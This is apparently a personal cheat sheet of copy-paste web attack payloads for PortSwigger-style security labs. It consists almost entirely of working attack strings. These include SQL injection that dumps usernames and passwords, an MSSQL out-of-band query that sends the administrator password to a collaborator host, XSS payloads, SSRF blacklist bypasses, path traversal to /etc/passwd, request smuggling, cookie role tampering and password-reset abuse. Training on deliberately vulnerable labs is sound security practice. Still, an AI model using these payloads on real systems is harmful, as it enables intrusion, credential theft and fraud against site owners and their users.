# Hunter Lab Solutions Database - Verified & Tested

## Quick Copy-Paste Payloads (All Verified in Labs)

### SQLi — Cookie Injection (Most Common in PortSwigger)
```
TrackingId=xyz'||'1'='1              # Boolean true
TrackingId=xyz'||'1'='2              # Boolean false
TrackingId=xyz' AND SUBSTRING(password,1,1)='a'--  # Blind char extract
TrackingId=xyz'||pg_sleep(10)--      # PostgreSQL time delay
TrackingId=xyz' UNION SELECT BANNER,NULL FROM v$version--  # Oracle version
TrackingId=xyz' UNION SELECT NULL,username||':'||password FROM users--  # Data extraction
TrackingId=xyz';exec master..xp_dirtree '\\'+(SELECT password FROM users WHERE username='administrator')+'.COLLAB\a'--  # MSSQL OOB
```

### XSS — Context-Specific
```
# Reflected XSS in JavaScript string (NOT encoded in script context)
'-alert(1)-'

# Stored XSS in href attribute
javascript:alert(1)

# DOM XSS via jQuery hashchange
#<img src=x onerror=print()>
# Delivery: iframe.src = sameURL + '#hash'
```

### SSRF — Bypass Techniques
```
# Host blacklist bypass (127.1 instead of 127.0.0.1)
stockApi=http://127.1/admin

# Path blacklist bypass (double URL encoding)
stockApi=http://127.1/%2561dmin

# Open redirect chain
stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin
```

### Access Control
```
# Cookie role tampering
Cookie: Admin=false  →  Cookie: Admin=true
```

### Auth — Enumeration
```
# Different responses
POST /login → "Invalid username" vs "Incorrect password" → valid username exists

# Timing attack (one request at a time, 5s delay!)
# Valid username: ~1.4s (bcrypt hash), Invalid: ~0.8s
```

### Info Disclosure
```
# Trigger error for version leak
GET /product?productId=abc  → Java stack trace with framework version
```

### Path Traversal
```
# Simple (no filter)
../../../etc/passwd

# Non-recursive strip bypass
....//....//....//etc/passwd
```

### Business Logic
```
# Negative quantity exploit
quantity: -235  → reduces total price
```

### Race Condition
```
# Coupon abuse (concurrent requests)
POST /cart/coupon  ×20  → 20x discount applied
```

### HTTP Request Smuggling
```
# CL.TE (MUST use raw socket, Burp HTTP/2 breaks this!)
Content-Length: 25
Transfer-Encoding: chunked

0\r\n\r\nGPOST / HTTP/1.1\r\n\r\n
```

### Auth — Password Reset
```
# Token not bound to user
POST /forgot-password?temp-forgot-password-token=
temp-forgot-password-token=&username=carlos&new-password-1=hacked&new-password-2=hacked
```
